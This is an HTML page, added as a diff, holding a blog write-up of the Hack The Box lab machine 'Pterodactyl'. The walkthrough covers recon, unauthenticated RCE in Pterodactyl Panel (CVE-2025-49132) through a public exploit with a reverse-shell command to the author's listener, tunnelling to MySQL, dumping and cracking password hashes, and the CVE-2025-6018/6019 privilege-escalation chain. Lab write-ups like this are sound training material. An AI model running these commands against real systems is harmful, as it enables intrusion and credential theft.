@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Season10 - Writeups - Pterodactyl</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrix"></canvas>
+
+    <header>
+        <div class="header-content">
+            <div class="terminal-prompt">k0d14k@kali:~#</div>
+            <div class="img-text">
+                <img src="/static/images/avatar.png" width="100rem">
+                <div class="text">
+                    <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                    <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/#about">Whoami</a></li>
+            <li><a href="/#skills">Skills</a></li>
+            <li><a href="/#projects">Projects</a></li>
+            <li><a href="/#contact">Contacts</a></li>
+        </ul>
+    </nav>
+
+    <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/pterodactyl.png" alt="500rem">   
+        <h1>Pterodactyl - HTB Season 10</h1>
+
+        <p>
+          <b>Categories</b>: #pterodactyl, #game-server, #CVE-2025-49132, #CVE-2025-6018, #CVE-2025-6019, #pam-injection, #file-system-race-condition
+        </p>
+
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="nmap-scan-tcp">
+            <h2>cat nmap-scan-tcp</h2>
+            <div class="code">
+                # Nmap 7.98 scan initiated Mon Feb  9 11:58:37 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN tcp-scan 10.129.5.93 <br>
+                Nmap scan report for 10.129.5.93 <br>
+                Host is up (0.13s latency). <br>
+                Not shown: 982 filtered tcp ports (no-response), 14 filtered tcp ports (admin-prohibited) <br>
+                PORT     STATE  SERVICE    VERSION <br>
+                22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0) <br>
+                | ssh-hostkey:  <br>
+                |   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA) <br>
+                |_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519) <br>
+                80/tcp   open   http       nginx 1.21.5 <br>
+                |_http-server-header: nginx/1.21.5 <br>
+                |_http-title: Did not follow redirect to http://pterodactyl.htb/ <br>
+                443/tcp  closed https <br>
+                8080/tcp closed http-proxy <br>
+                <br>
+                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . <br>
+                # Nmap done at Mon Feb  9 11:58:57 2026 -- 1 IP address (1 host up) scanned in 20.13 seconds <br>
+            </div>
+
+            <p>
+              The TCP port scan reveals that the only two open ports are <span class="highlight">22</span> and <span class="highlight">80</span>, the latter 
+              redirecting to <span class="highlight">pterodactyl.htb</span>. I add the resolution to my <span class="highlist">/etc/hosts</span> file:
+            </p>
+            
+            <div class="code">echo "10.129.5.93 pterodactyl.htb" | sudo tee -a /etc/hosts</div>
+
+            <p>
+              Once the page is accessed, I am presented with a <span class="highlight">Minecraft</span> server. Investigating further the nature of the software 
+              in front of me, I discover that Pterodactyl is a software that allows managing <span class="highlight">game servers</span>.
+            </p>
+
+        </section>
+
+        <section id="fuzzing">
+          <h2>cat fuzzing</h2>
+
+          <div class="code">
+            ffuf -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 200 -ac -r -o fuzzing-subdomain.html -of html <br>
+            <br>
+            [...]
+            <br>
+                  v2.1.0-dev <br>
+            _______________________________________________ <br>
+<br>
+            :: Method           : GET <br>
+            :: URL              : http://pterodactyl.htb <br>
+            :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt <br>
+            :: Header           : Host: FUZZ.pterodactyl.htb <br>
+            :: Output file      : fuzzing-subdomain.html <br>
+            :: File format      : html <br>
+            :: Follow redirects : true <br>
+            :: Calibration      : true <br>
+            :: Timeout          : 10 <br>
+            :: Threads          : 200 <br>
+            :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 <br>
+            ________________________________________________ <br>
+<br>
+            panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 542ms] <br>
+            :: Progress: [100000/100000] :: Job [1/1] :: 650 req/sec :: Duration: [0:02:42] :: Errors: 0 :: <br>
+          </div>
+
+          <p>
+            The web application subdomain enumeration reveals the presence of a <span class="highlight">panel</span> subdomain. Adding this to my 
+            <span class="highlight">/etc/hosts</span> file as well, I discover that this is the Pterodactyl service access panel.
+          </p>
+
+          <div class="code">echo "10.129.5.93 panel.pterodactyl.htb" | sudo tee -a /etc/hosts</div>
+
+          <img src="images/Pasted image 20260209122346.png" width="1000rem">
+          
+          <p>
+            Not knowing any access credentials, I continue to investigate whether there are known vulnerabilities by searching on Google, and I come across 
+            <a target="_blank" href="https://www.exploit-db.com/exploits/52341">CVE-2025-49132</a>, which should be an Unauthenticated RCE.
+          </p>
+
+          <p>
+            Running the script retrieved via <a target="_blank" href="https://www.exploit-db.com/">ExploitDB</a> reveals <span class="highlight">MySQL</span> database access 
+            credentials, which however does not appear to be reachable.
+          </p>
+
+          <div class="code">
+            python3 52341.py http://panel.pterodactyl.htb                                 
+            http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
+          </div>
+
+          <p>
+            This script confirmed the vulnerability but did not allow me to execute arbitrary code. After some research on GitHub I found this 
+            <a target="_blank" href="https://github.com/YoyoChaud/CVE-2025-49132">repository</a>, which is much more dynamic and allows me to open a reverse shell.
+          </p>
+          <div class="code">
+            python3 exploit.py http://panel.pterodactyl.htb --rce-cmd "sh -i >& /dev/tcp/10.10.15.244/1234 0>&1" --pear-dir /usr/share/php/PEAR <br>
+            <br>
+            [...]
+            <br>
+              Pterodactyl Panel - Unauthenticated Exploit <br>
+              Targets: <= 1.11.10 | Patched: 1.11.11 <br>
+              Exploit By YoyoChaud <br>
+            <br>
+            <br>
+            ════════════════════════════════════════════════════════════<br>
+              VULNERABILITY CHECK <br>
+            ════════════════════════════════════════════════════════════ <br>
+              [*] Target: http://panel.pterodactyl.htb <br>
+              [+] Endpoint accessible without hash parameter <br>
+              [+] TARGET IS VULNERABLE <br>
+            <br> 
+            ════════════════════════════════════════════════════════════ <br>
+              RCE (pearcmd) — sh -i >& /dev/tcp/10.10.15.244/1234 0>&1 <br>
+            ════════════════════════════════════════════════════════════ <br>
+              [+] Output: <br>
+            (connection held — check your listener) <br>
+          </div>
+        </section>
+
+        <section id="foothold">
+          <h2>cat foothold</h2>
+          
+          <p>By launching the exploit described above, I was able to open a reverse shell as user `wwwrun` and retrieve the user flag.</p>
+
+          <div class="code">
+            sh-4.4$ whoami & id & hostname <br>
+            whoami & id & hostname <br>
+            [1] 23035 <br>
+            [2] 23036 <br>
+            wwwrun <br>
+            uid=474(wwwrun) gid=477(www) groups=477(www) <br>
+            pterodactyl <br>
+            sh-4.4$ find / -name user.txt 2>/dev/null <br>
+            find / -name user.txt 2>/dev/null <br>
+            /home/phileasfogg3/user.txt <br>
+            sh-4.4$ cat /home/phileasfogg3/user.txt <br>
+            cat /home/phileasfogg3/user.txt <br>
+            2a1e962c09fdb6f7ab7701d3f698f392 <br>
+            sh-4.4$ 
+          </div>
+
+          <p>
+            After several attempts I notice that the current user has a <span class="highlight">nologin</span> shell. This prevents us from using
+            <span class="highlight">MySQL</span> with the previously retrieved credentials and from accessing the data stored in the database. To work around 
+            this limitation we need to move to a shell without this restriction. To do so, we can set up port forwarding with ligolo and access the <span class="highlight">MySQL</span> 
+            service through our own shell.
+          </p>
+
+          <h3>Attacker Side:</h3>
+          <div class="code">
+            sudo ./proxy -selfcert <br>
+            ... <br>
+            Interfaces and routes with "Pending" state will be created on tunnel start. <br>
+            ligolo-ng » ifcreate --name iptero <br>
+            INFO[0030] Creating a new iptero interface...            <br>
+            INFO[0030] Interface created! <br>
+          </div>
+
+          <h3>Victim Side:</h3>
+          <div class="code">
+            ./agent -ignore-cert -connect 10.10.15.244:11601 &
+          </div>
+
+          <h3>Back on the attacker side:</h3>
+          <div class="code">
+            ligolo-ng » INFO[0043] Agent joined.                                 id=005056b02132 name=wwwrun@pterodactyl remote="10.129.5.205:58360" <br>
+            ligolo-ng » <br>
+            ligolo-ng » session <br>
+            ? Specify a session : 1 - wwwrun@pterodactyl - 10.129.5.205:58360 - 005056b02132 <br>
+            [Agent : wwwrun@pterodactyl] » tunnel_start --tun iptero <br> 
+            INFO[0059] Starting tunnel to wwwrun@pterodactyl (005056b02132)  <br>
+            [Agent : wwwrun@pterodactyl] » route_add --name iptero --route 240.0.0.1/32 <br>
+            INFO[0074] Route created. 
+          </div>
+
+          <p>Now that our route is set up, we can use it to run the following command directly from our machine:</p>
+
+          <div class="code">
+            mysql -u pterodactyl -pPteraPanel -h 240.0.0.1 -D panel <br>
+            ... <br>
+            <br>
+            MariaDB [panel]> select username, password from users; <br>
+            +--------------+--------------------------------------------------------------+ <br>
+            | username     | password                                                     | <br>
+            +--------------+--------------------------------------------------------------+ <br>
+            | headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | <br>
+            | phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | <br>
+            +--------------+--------------------------------------------------------------+ <br>
+            2 rows in set (0.133 sec) <br>
+            <br>
+            MariaDB [panel]> <br>
+          </div>
+
+          <p>
+            And retrieve the password hashes of the two portal users, which happen to be the same ones used on the victim machine.
+          </p>
+        </section>
+
+        <section id="lateral-movement">
+          <h2>cat lateral-movement</h2>
+
+          <p>
+            Once the hashes are recovered, I try to crack them with <span class="highlight">john</span> and obtain a valid set of credentials for 
+            <span class="highlight">ssh</span>:
+          </p>
+
+          <div class="code">phileasfogg3:!QAZ2wsx</div>
+
+          <p>Once logged in, I run linpeas which highlights the presence of emails in the <span class="highlight">/var/mail</span> folder.</p>
+
+          <p>Reading the <span class="highlight">phileasfogg3</span> file I obtain the following email:</p>
+
+          <div class="code">
+            From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025 <br>
+            Delivered-To: phileasfogg3@pterodactyl <br>
+            Received: by pterodactyl (Postfix, from userid 0) <br>
+            id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET) <br>
+            From: headmonitor headmonitor@pterodactyl <br>
+            To: All Users all@pterodactyl <br>
+            Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert) <br>
+            Message-ID: 202511070915.headmonitor@pterodactyl <br>
+            Date: Fri, 07 Nov 2025 09:15:00 +0100 <br>
+            MIME-Version: 1.0 <br>
+            Content-Type: text/plain; charset="utf-8" <br>
+            Content-Transfer-Encoding: 7bit <br>
+            <br>
+            Attention all users, <br>
+            <br>
+            Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required. <br>
+            <br>
+            Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply 
+            pending updates. <br>
+            <br>
+            Report any signs of compromise immediately to headmonitor@pterodactyl.htb <br>
+            <br>
+            — HeadMonitor <br>
+            System Administrator
+          </div>
+
+          <p>
+            Not knowing where to start, I asked GPT whether there were any privilege escalation vectors related to <span class="highlight">udisksd</span>. 
+            The answer was yes, and not just one. The attack is actually a chain of two CVEs, <span class="highlight">CVE-2025-6018</span> and 
+            <span class="highlight">CVE-2025-6019</span>. The script I used can be found at the following <a target="_blank" href="https://github.com/0rionCollector/Exploit-Chain-CVE-2025-6018-6019">repository</a>.
+          </p>
+        </section>
+
+        <section id="privilege-escalation">
+          <h2>cat privilege-escalation</h2>
+          <p>Once the script is downloaded, just follow the instructions. From the attacker machine I run:</p>
+
+          <div class="code">
+            sudo ./ExploitChain.sh stage1 <br>
+            ... <br>
+            scp scp xfs.image phileasfogg3@pterodactyl.htb:/tmp/k
+          </div>
+
+          <p>From the victim machine instead I run:</p>
+
+          <div class="code">
+            ./ExploitChain.sh stage2 <br>
+            exit <br>
+            ./ExploitChain.sh stage3 #AFTER LOGGING IN AGAIN <br>
+            ... <br>
+            ======================================== <br>
+            bash-5.3# whoami <br>
+            root <br>
+            bash-5.3# id <br>
+            uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users) <br>
+            bash-5.3# cat /root/root.txt <br>
+            32ac5557af4decdc27a6879ef60b4c29 <br>
+            bash-5.3# 
+          </div>
+        </section>
+
+        
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> 2a1e962c09fdb6f7ab7701d3f698f392</h3>
+            <h3><b>Root Flag:</b> 32ac5557af4decdc27a6879ef60b4c29</h3>
+        </section>
+    </main>
+
+
+    <footer>
+        <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+        <p>&copy; 2025 K0D14K</p>
+    </footer>
+
+    <script src="/static/script.js"></script>
+    <script> lister() </script>
+</body>
